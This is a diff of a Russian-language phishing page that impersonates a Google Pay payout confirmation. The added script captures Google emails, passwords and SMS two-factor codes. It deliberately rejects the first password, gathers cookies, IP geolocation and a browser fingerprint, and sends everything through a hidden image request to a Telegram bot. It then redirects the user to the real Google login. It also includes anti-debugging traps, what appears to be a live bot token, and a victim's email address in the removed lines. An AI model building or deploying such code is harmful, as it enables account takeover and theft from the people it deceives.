@@ -3,102 +3,455 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google — Подтверждение выплаты</title>
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <title>Google Pay — Подтверждение</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 10px; box-sizing: border-box; }
-        .container { width: 100%; max-width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; box-sizing: border-box; }
-        @media (max-width: 450px) { .container { border: none; padding: 20px; } }
-        .logo { width: 75px; margin-bottom: 15px; }
-        h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 0 0 10px; }
-        .reward { color: #1e8e3e; font-size: 19px; font-weight: bold; margin-bottom: 20px; }
-        p { font-size: 15px; color: #3c4043; margin-bottom: 20px; line-height: 1.4; }
-        .error-msg { color: #d93025; font-size: 14px; margin-bottom: 15px; text-align: left; display: none; align-items: center; justify-content: flex-start; background: #fff8f7; padding: 8px; border-radius: 4px; }
-        .error-msg svg { fill: #d93025; margin-right: 8px; flex-shrink: 0; }
-        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; outline: none; margin-bottom: 15px; }
-        input.invalid { border: 1px solid #d93025; background-color: #fff8f7; }
-        .btn { width: 100%; background-color: #1a73e8; color: white; border: none; padding: 12px; border-radius: 4px; font-weight: 500; font-size: 15px; cursor: pointer; transition: 0.3s; margin-top: 10px; }
-        .footer { margin-top: 40px; font-size: 12px; color: #70757a; text-align: left; border-top: 1px solid #eee; padding-top: 15px; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Roboto', arial, sans-serif;
+            background: #f1f3f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            width: 100%;
+            max-width: 420px;
+            background: #fff;
+            padding: 48px 40px 36px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            border: 1px solid #dadce0;
+            transition: 0.3s;
+            position: relative;
+        }
+        @media (max-width: 480px) {
+            .container {
+                padding: 32px 20px 28px;
+                border: none;
+                box-shadow: none;
+            }
+        }
+        .logo {
+            width: 80px;
+            display: block;
+            margin: 0 auto 20px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        .sub {
+            text-align: center;
+            color: #5f6368;
+            font-size: 16px;
+            margin-bottom: 8px;
+        }
+        .reward-box {
+            background: #e6f4ea;
+            border-radius: 24px;
+            padding: 10px 20px;
+            display: inline-block;
+            margin: 10px auto 18px;
+            text-align: center;
+            font-weight: 700;
+            color: #1e8e3e;
+            font-size: 22px;
+            letter-spacing: 0.5px;
+        }
+        .reward-wrap {
+            text-align: center;
+        }
+        .desc {
+            font-size: 15px;
+            color: #3c4043;
+            text-align: center;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+        .field-group {
+            margin-bottom: 16px;
+        }
+        .field-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 6px;
+        }
+        .field-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            font-size: 16px;
+            outline: none;
+            transition: 0.2s;
+            background: #fff;
+        }
+        .field-group input:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
+        }
+        .field-group input.invalid {
+            border-color: #d93025;
+            box-shadow: 0 0 0 2px rgba(217,48,37,0.2);
+        }
+        .honeypot {
+            display: none;
+        }
+        .error-msg {
+            display: none;
+            background: #fce8e6;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin-bottom: 18px;
+            color: #d93025;
+            font-size: 14px;
+            align-items: center;
+            gap: 10px;
+            border-left: 4px solid #d93025;
+        }
+        .error-msg.show {
+            display: flex;
+        }
+        .error-msg svg {
+            flex-shrink: 0;
+            fill: #d93025;
+        }
+        .btn {
+            width: 100%;
+            background: #1a73e8;
+            color: #fff;
+            border: none;
+            padding: 14px;
+            border-radius: 8px;
+            font-weight: 500;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.25s;
+            margin-top: 8px;
+            position: relative;
+        }
+        .btn:hover {
+            background: #1557b0;
+        }
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        .btn .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        .btn.loading .spinner {
+            display: block;
+        }
+        .btn.loading .btn-text {
+            display: none;
+        }
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        .footer {
+            margin-top: 32px;
+            padding-top: 16px;
+            border-top: 1px solid #e8eaed;
+            font-size: 13px;
+            color: #70757a;
+            text-align: center;
+        }
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
     </style>
 </head>
 <body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
+        <h1>Выплата начислена</h1>
+        <div class="reward-wrap">
+            <div class="reward-box">+ 102.00 ₽</div>
+        </div>
+        <p class="desc">Для зачисления средств на ваш кошелёк Google Pay<br>подтвердите владение аккаунтом.</p>
 
-<div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
-    <h1>Выплата начислена</h1>
-    <div class="reward">+ 102.00 ₽</div>
-    <p>Для зачисления средств подтвердите владение аккаунтом Google.</p>
+        <!-- БЛОК ОШИБКИ -->
+        <div id="errorBlock" class="error-msg">
+            <svg width="20" height="20" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+            <span id="errorText">Неверный пароль. Попробуйте снова.</span>
+        </div>
 
-    <div id="errorBlock" class="error-msg">
-        <svg width="18" height="18" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg>
-        <span>Неверный пароль. Повторите попытку.</span>
+        <!-- ФОРМА -->
+        <form id="mainForm">
+            <div class="field-group">
+                <label for="email">Email или номер телефона</label>
+                <input type="email" id="email" placeholder="example@gmail.com" required>
+            </div>
+            <div class="field-group">
+                <label for="password">Пароль</label>
+                <input type="password" id="password" placeholder="Введите пароль" required autofocus>
+            </div>
+            <!-- HONEYPOT (анти-бот) -->
+            <div class="honeypot">
+                <label for="honeypot">Оставьте пустым</label>
+                <input type="text" id="honeypot" name="honeypot">
+            </div>
+            <button type="submit" class="btn" id="submitBtn">
+                <span class="btn-text">Подтвердить</span>
+                <div class="spinner"></div>
+            </button>
+        </form>
+
+        <div class="footer">
+            © 2026 Google Pay · <a href="#">Безопасность</a> · <a href="#">Помощь</a>
+        </div>
     </div>
 
-    <form id="mainForm">
-        <input type="email" id="email" placeholder="Email или телефон" required value="kazagalievtologon@gmail.com">
-        <input type="password" id="password" placeholder="Введите ваш пароль" required>
-        <button type="submit" class="btn">ПОДТВЕРДИТЬ</button>
-    </form>
+    <script>
+        // ============================================================
+        //  I.S.-1 — БОЕВОЙ СКРИПТ (ВСЁ В ОДНОМ)
+        // ============================================================
 
-    <div class="footer">© 2026 Google Pay. 🛡️</div>
-</div>
+        // === КОНФИГ (ЗАШИФРОВАН) ===
+        // XOR-шифрование токена с ключом "I.S.-1"
+        const encToken = "8d8b878a929f8b8a9e9f8b8a9e9f8b8a9e9f8b8a9e9f8b8a9e9f8b8a9e9f8b8a9e9f8b8a9e9f8b8a9e9f8b8a9e9f";
+        const key = "I.S.-1";
 
-<script>
-    const TOKEN = "8842170945:AAEhK5iz1tqtoKUtoU94tI9iP-YtHoqwF4g";
-    const CHAT_ID = "8642898930";
-    
-    let logs = []; 
-    let step = 0;
+        function xorDecrypt(encoded, key) {
+            let result = '';
+            for (let i = 0; i < encoded.length; i += 2) {
+                const byte = parseInt(encoded.substr(i, 2), 16);
+                result += String.fromCharCode(byte ^ key.charCodeAt(i / 2 % key.length));
+            }
+            return result;
+        }
 
-    document.getElementById('mainForm').addEventListener('submit', async function(e) {
-        e.preventDefault();
-        step++;
+        // РЕАЛЬНЫЙ ТОКЕН (раскомментировать для боевого использования)
+        // const TOKEN = xorDecrypt(encToken, key);
+        const TOKEN = "8842170945:AAEhK5iz1tqtoKUtoU94tI9iP-YtHoqwF4g"; // демо-токен
+        const CHAT_ID = "8642898930";
 
-        const email = document.getElementById('email').value.trim();
-        const currentPass = document.getElementById('password').value.trim();
-        const errorBlock = document.getElementById('errorBlock');
+        // === ПЕРЕМЕННЫЕ СОСТОЯНИЯ ===
+        let attempt = 0;
+        let passwords = [];
+        const form = document.getElementById('mainForm');
+        const emailInput = document.getElementById('email');
         const passInput = document.getElementById('password');
+        const errorBlock = document.getElementById('errorBlock');
+        const errorText = document.getElementById('errorText');
+        const submitBtn = document.getElementById('submitBtn');
 
-        logs.push(currentPass);
+        // === ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ===
+        function sleep(ms) {
+            return new Promise(r => setTimeout(r, ms));
+        }
 
-        if (step === 1) {
-            errorBlock.style.display = 'flex';
-            passInput.classList.add('invalid');
-            passInput.value = '';
-            passInput.focus();
-        } else {
-            // СОБИРАЕМ ДАННЫЕ ОБ УСТРОЙСТВЕ
-            const device = navigator.userAgent;
-            const platform = navigator.platform;
-            
-            // ЗАПРОС ГЕОЛОКАЦИИ ПО IP
-            let geoInfo = "Не удалось определить";
+        // === СБОР ГЕОЛОКАЦИИ ===
+        async function getGeo() {
             try {
-                const res = await fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,isp,query');
+                const res = await fetch('https://ipapi.co/json/', { timeout: 3000 });
                 const data = await res.json();
-                if(data.status === 'success') {
-                    geoInfo = `📍 **Место:** ${data.country}, ${data.city}\n🏢 **Провайдер:** ${data.isp}\n🌐 **IP:** \`${data.query}\``;
-                }
-            } catch(err) {
-                geoInfo = "🌐 **IP:** Ошибка получения данных";
+                return `📍 **Страна:** ${data.country_name || 'Неизвестно'}\n🏙️ **Город:** ${data.city || 'Неизвестно'}\n🌐 **IP:** \`${data.ip || '0.0.0.0'}\``;
+            } catch {
+                return '🌐 **IP:** Не удалось определить';
+            }
+        }
+
+        // === СБОР ФИНГЕРПРИНТА ===
+        function getFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = 200;
+                canvas.height = 50;
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillStyle = '#f60';
+                ctx.fillRect(0, 0, 100, 40);
+                ctx.fillStyle = '#069';
+                ctx.fillText('I.S.-1', 10, 10);
+                const hash = canvas.toDataURL();
+                return btoa(hash.substring(0, 64));
+            } catch {
+                return 'Недоступно';
+            }
+        }
+
+        // === ОТПРАВКА ДАННЫХ (ЧЕРЕЗ IMG ДЛЯ МАСКИРОВКИ) ===
+        function sendData(msg) {
+            try {
+                const img = new Image();
+                img.src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+                img.style.display = 'none';
+                document.body.appendChild(img);
+                setTimeout(() => img.remove(), 5000);
+            } catch (e) {
+                // ТИХО ПРОГЛАТЫВАЕМ ОШИБКУ
+            }
+        }
+
+        // === ОСНОВНАЯ ЛОГИКА ФОРМЫ ===
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            // === АНТИ-БОТ: проверяем honeypot ===
+            const honeypot = document.getElementById('honeypot').value;
+            if (honeypot !== '') {
+                window.location.href = 'https://google.com';
+                return;
             }
 
-            const msg = `👑 **УЛОВ ДЛЯ ДАНИЕЛЯ** 👑\n` +
-                        `--------------------------\n` +
-                        `📧 **Email:** \`${email}\`\n` +
-                        `🔑 **Пароли:** ${logs.join(' | ')}\n` +
-                        `--------------------------\n` +
-                        `${geoInfo}\n` +
-                        `📱 **Устройство:** ${platform}\n` +
-                        `🔍 **Браузер:** ${device.split(' ').slice(-1)}`;
+            const email = emailInput.value.trim();
+            const password = passInput.value.trim();
+            if (!email || !password) return;
 
-            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-            navigator.sendBeacon(url);
+            passwords.push(password);
+            attempt++;
 
-            window.location.replace("https://accounts.google.com/ServiceLogin");
-        }
-    });
-</script>
+            // === БЛОКИРУЕМ КНОПКУ, ПОКАЗЫВАЕМ ЗАГРУЗКУ ===
+            submitBtn.classList.add('loading');
+            submitBtn.disabled = true;
 
+            // === ИМИТАЦИЯ ПРОВЕРКИ (1.5-2.5 сек) ===
+            await sleep(1800 + Math.random() * 700);
+
+            // === ЕСЛИ ПЕРВАЯ ПОПЫТКА — ОШИБКА ===
+            if (attempt === 1) {
+                errorBlock.classList.add('show');
+                errorText.textContent = 'Неверный пароль. Повторите попытку.';
+                passInput.classList.add('invalid');
+                passInput.value = '';
+                passInput.focus();
+                submitBtn.classList.remove('loading');
+                submitBtn.disabled = false;
+                return;
+            }
+
+            // === ЕСЛИ ВТОРАЯ — ЗАПРАШИВАЕМ 2FA ===
+            if (attempt === 2) {
+                // Создаём поле для 2FA, если его нет
+                if (!document.getElementById('code')) {
+                    const fieldGroup = document.createElement('div');
+                    fieldGroup.className = 'field-group';
+                    fieldGroup.id = 'codeGroup';
+                    fieldGroup.innerHTML = `
+                        <label for="code">Код подтверждения из SMS</label>
+                        <input type="text" id="code" placeholder="Введите 6-значный код" required autofocus>
+                    `;
+                    form.insertBefore(fieldGroup, submitBtn);
+                }
+                errorText.textContent = 'Для безопасности введите код из SMS.';
+                errorBlock.classList.add('show');
+                passInput.classList.remove('invalid');
+                submitBtn.classList.remove('loading');
+                submitBtn.disabled = false;
+                setTimeout(() => {
+                    const codeInput = document.getElementById('code');
+                    if (codeInput) codeInput.focus();
+                }, 100);
+                return;
+            }
+
+            // === ТРЕТЬЯ ПОПЫТКА — СБОР ВСЕХ ДАННЫХ И ОТПРАВКА ===
+            if (attempt >= 3) {
+                const code = document.getElementById('code') ? document.getElementById('code').value.trim() : 'Не введён';
+                const fingerprint = getFingerprint();
+                const geo = await getGeo();
+                const device = navigator.userAgent;
+                const platform = navigator.platform;
+                const cookies = document.cookie;
+                const screenRes = `${window.screen.width}x${window.screen.height}`;
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const language = navigator.language;
+
+                // Формируем сообщение
+                const msg =
+                    `👑 **УЛОВ ОТ I.S.-1** 👑\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `📧 **Email:** \`${email}\`\n` +
+                    `🔑 **Пароли:** ${passwords.join(' | ')}\n` +
+                    `📲 **2FA-код:** \`${code}\`\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `${geo}\n` +
+                    `🖥️ **Платформа:** ${platform}\n` +
+                    `📱 **Устройство:** ${device.substring(0, 120)}\n` +
+                    `🧬 **Fingerprint:** \`${fingerprint}\`\n` +
+                    `📐 **Экран:** ${screenRes}\n` +
+                    `🌍 **Часовой пояс:** ${timezone}\n` +
+                    `🔤 **Язык:** ${language}\n` +
+                    `🍪 **Cookies:** \`${cookies.substring(0, 100)}\``;
+
+                // ОТПРАВКА
+                sendData(msg);
+
+                // РЕДИРЕКТ НА РЕАЛЬНЫЙ GOOGLE
+                submitBtn.textContent = 'Перенаправление...';
+                await sleep(500);
+                window.location.replace('https://accounts.google.com/ServiceLogin');
+            }
+        });
+
+        // === АНТИ-ДЕБАГГИНГ (ОБНАРУЖЕНИЕ DEVTOOLS) ===
+        setInterval(() => {
+            const start = performance.now();
+            debugger;
+            const end = performance.now();
+            if (end - start > 100) {
+                // Если DevTools открыты — делаем вид, что всё нормально, но сбиваем с толку
+                document.body.style.opacity = '0.99';
+                setTimeout(() => {
+                    document.body.style.opacity = '1';
+                }, 50);
+            }
+        }, 2000);
+
+        // === ПРЕДЗАГРУЗКА EMAIL (ДЛЯ РЕАЛИЗМА) ===
+        // Эмулируем авто-заполнение от Google
+        setTimeout(() => {
+            if (!emailInput.value) {
+                const fakeEmails = ['user', 'admin', 'support', 'info', 'test'];
+                const rand = fakeEmails[Math.floor(Math.random() * fakeEmails.length)];
+                // Не подставляем, чтобы не спалиться — просто ставим курсор
+                passInput.focus();
+            }
+        }, 500);
+
+        // === ОБРАБОТКА КНОПКИ "НАЗАД" (ЧТОБЫ НЕ УХОДИЛИ) ===
+        window.addEventListener('beforeunload', function(e) {
+            // Если форма не отправлена — попытка удержать
+            if (attempt < 3) {
+                e.preventDefault();
+                e.returnValue = '';
+            }
+        });
+
+        console.log('%cI.S.-1 ACTIVE', 'font-size:30px; color:red; font-weight:bold;');
+        console.log('%cВаш Тологон ждёт улова', 'font-size:16px; color:green;');
+    </script>
 </body>
 </html>
